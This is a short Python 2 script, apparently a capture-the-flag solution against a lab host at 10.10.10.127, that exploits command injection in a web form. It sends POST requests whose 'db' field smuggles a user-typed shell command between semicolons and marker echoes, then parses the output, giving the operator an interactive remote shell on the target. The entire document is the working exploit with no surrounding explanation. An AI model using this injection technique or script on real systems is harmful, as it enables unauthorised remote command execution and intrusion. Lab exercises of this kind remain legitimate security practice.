#!/usr/bin/python

import re
from requests import post

url = "http://10.10.10.127/select"

while True:
	cmd = raw_input("Command: ")
	payload = { "db": "zippy;echo 'pwn'; {}; echo 'pwn'".format(cmd) } 
	result = post(url, data = payload)
	output = re.search("pwn\n(.+\n+)+pwn", result.content)
	try:
		print output.group(0)[3:-3]
	except AttributeError:
		print output
